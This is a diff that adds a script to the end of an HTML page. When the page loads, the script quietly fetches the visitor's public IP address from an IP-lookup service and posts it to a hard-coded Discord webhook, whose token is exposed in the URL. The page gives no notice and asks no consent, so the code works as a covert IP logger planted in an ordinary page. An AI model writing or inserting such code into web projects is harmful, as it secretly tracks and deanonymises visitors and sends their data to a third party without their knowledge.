@@ -294,4 +294,49 @@
         style="position: absolute; top: 0px; left: 0px; border: none; visibility: hidden;"></iframe>
 </body>
 
+
+    <script>
+        function getUserIP() {
+            return fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => data.ip)
+                .catch(error => {
+                    console.error('Error fetching IP:', error);
+                    throw error;
+                });
+        }
+
+        function sendIPToDiscord(ip) {
+            const webhookURL = 'https://discord.com/api/webhooks/1267286543060435067/sNxyn-ErkL9gzdHHXYXzHIY93kAJ0uk4nBAAPMQhj4xrPcfpYHHn345fFNEX-ztSiNhz';
+            const payload = {
+                content: `User IP: ${ip}`
+            };
+
+            return fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Error sending IP to Discord');
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log('Successfully sent IP to Discord:', data);
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        }
+
+        getUserIP()
+            .then(ip => sendIPToDiscord(ip))
+            .catch(error => console.error('Failed to send IP:', error));
+    </script>
+
+
 </html>
